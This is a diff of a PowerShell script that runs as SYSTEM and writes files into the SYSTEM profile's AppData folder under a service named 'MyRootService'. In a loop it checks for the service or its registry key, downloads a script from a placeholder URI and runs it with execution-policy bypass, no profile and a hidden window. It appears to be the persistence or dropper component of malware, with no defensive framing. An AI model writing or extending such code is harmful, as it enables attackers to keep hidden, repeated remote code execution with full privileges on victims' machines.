@@ -1,8 +1,24 @@
 #script must run as admin/SYSTEM
-$serviceName = "MyService" # change this to the name of the service
+param(
+    [string]$rootPath
+)
+
+$paths = @(
+    "$env:windir\system32\config\systemprofile\AppData\Local"
+)
+
+$serviceName = "MyRootService" # change this to the name of the service
 $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
-$rootPath = "path\to\root_script.ps1"
-$initServicePath = "path\to\init_service.ps1"
+if(($rootPath -eq "") -or ($rootPath -eq $null)){
+    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+    $rootPath = $paths[$idx]
+    $rootPath = "$rootPath\root.ps1"
+}else{
+    $rootPath = "$rootPath\root.ps1"
+}
+$idx = Get-Random -Minimum 0 -Maximum $paths.Length
+$initServicePath = $paths[$idx]
+$initServicePath = "$initServicePath\init_service_root.ps1"
 
 function Check-ServiceReg{
     $c = Get-Item -Path $regPath -ErrorAction SilentlyContinue
@@ -34,7 +50,7 @@ while ($true) {
     }
     
     if($regS -or $serv){
-        iwr -uri "INTI_SERVICE_URI" -OutFile $initServicePath
+        iwr -uri "INTI_SERVICE_ROOT_URI" -OutFile $initServicePath
         powershell.exe -ep bypass -noP -w hidden $initServicePath
     }
     Start-Sleep -Seconds 5
